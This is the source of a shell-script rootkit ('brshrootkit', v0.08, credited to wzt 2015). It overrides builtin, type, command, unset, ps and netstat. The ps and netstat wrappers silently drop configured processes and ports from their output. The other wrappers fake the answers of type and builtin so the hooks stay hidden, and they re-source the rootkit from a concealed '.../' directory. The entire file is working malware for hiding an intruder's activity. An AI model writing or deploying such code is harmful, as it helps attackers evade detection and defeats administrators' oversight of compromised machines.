#!/bin/sh
# Lightweight rootkit implemented by sh shell scripts v0.08
#
# by wzt 2015
#

BR_ROOTKIT_PATH="/home/$USER/.../"

builtin()
{
	local fake_a

	unset command
	case $1 in 
		"set"|"unset"|"command"|"type")
        		fake_a="$(command builtin $1 $2)"
			br_hide_engine "$fake_a"
			reset_command
			return ;;
		"builtin")
			echo "sh: builtin: builtin: syntax error, sh is not support."
			reset_command
			return ;;
		*)
			command builtin $1 $2
			reset_command
			;;
	esac
}

type()
{
        case $1 in
                "builtin"|"set"|"unset"|"type")
                        echo "$1 is a shell builtin"
                        return ;;
		"dir")
			echo "dir is /usr/bin/dir"
			return ;;
		"ls")
			echo "ls is aliased to ls --color=tty"
			return ;;
		"ps")
			echo "ps is /bin/ps"
			return ;;
		"netstat")
			echo "netstat is hashed (/usr/bin/netstat)"
			return ;;
		"/bin/ls"|"/usr/bin/dir"|"/bin/ps"|"/usr/bin/netstat")
			echo "$1 is $1"
			return ;;
                *)
			unset command
                        command type $1 $2
			reset_command
                        return ;;
        esac
}

fake_unset()
{
        case $1 in
                "builtin"|"command"|"set"|"unset"|"type")
                        echo "sh: syntax error, sh is not support."
                        return ;;
                *)
                        unset $1 $2
                        return ;;
        esac
}

fake_command()
{
        case $1 in
                "builtin"|"command"|"set"|"unset"|"type")
                        echo "sh: syntax error, sh is not support."
                        return ;;
                *)
			unset command
                        command $1 $2
                        reset_command
                        return ;;
        esac
}

command()
{
        case $1 in
                "builtin")
			builtin $2 $3
			return ;;
		"unset")
			fake_unset $2 $3
			. $BR_ROOTKIT_PATH/brshrootkit.sh
			return ;;
		"type")
			type $2 $3
			return ;;
		"command")
			fake_command $2 $3
			return ;;
                *)
			unset command
			command $2 $3
			. $BR_ROOTKIT_PATH/brshrootkit.sh
			return ;;
        esac
}

reset_command()
{
	command()
	{
        	case $1 in
                	"builtin")
                        	builtin $2 $3
                        	return ;;
                	"set")
                        	set $2 $3
                        	return ;;
                	"unset")
                        	fake_unset $2 $3
                        	. $BR_ROOTKIT_PATH/brshrootkit.sh
                        	return ;;
                	"type")
                        	type $2 $3
                        	return ;;
                	"command")
                        	fake_command $2 $3
                        	return ;;
                	*)
                        	unset command
                        	command $2 $3
                        	. $BR_ROOTKIT_PATH/brshrootkit.sh
                        	return ;;
        	esac
	}
}

ps()
{
        local proc_name hide_proc old_ifs

        . $BR_ROOTKIT_PATH/brshconfig.sh
        br_load_config $BR_ROOTKIT_PATH/brsh.conf

        old_ifs=$IFS; IFS=","

	echo $br_hide_proc
        proc_name=`/bin/ps $@`
       	proc_name=`echo "$proc_name" | sed '/'$br_hide_proc'/d'`
       	#proc_name=`echo "$proc_name" | sed '/sh/d'`

        echo "$proc_name"
	IFS=$old_ifs
}

netstat()
{
        local hide_port tmp_port old_ifs

        . $BR_ROOTKIT_PATH/brshconfig.sh
        br_load_config $BR_ROOTKIT_PATH/brsh.conf
	echo $br_hide_port

	old_ifs=$IFS; IFS=","
        tmp_port=`/usr/bin/netstat $@`
        tmp_port=`echo "$tmp_port" | sed '/'$br_hide_port'/d'`
        #tmp_port=`echo "$tmp_port" | sed '/22/d'`
        echo "$tmp_port"
	IFS=$old_ifs
}
